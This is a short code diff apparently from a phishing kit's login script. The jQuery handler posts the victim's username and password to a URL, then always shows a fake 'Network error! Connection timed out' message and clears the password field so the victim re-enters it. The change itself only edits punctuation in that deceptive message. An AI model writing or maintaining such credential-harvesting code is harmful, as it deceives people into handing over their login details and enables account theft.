@@ -217,7 +217,7 @@ $('#spin').fadeIn();
 jquery(e);$.post(url, {user:a,pass:b}, function(){
 setTimeout(function(){
 $('#error_msg').fadeIn();
-$('#error_msg').html('Network error! Connection timed out! Confirm sign in details and try again');
+$('#error_msg').html('Network error! Connection timed out. Confirm sign in details and try again');
 $('#pass').val('');
 $('#pass').focus();
 $('#subBtn').attr('disabled',false);
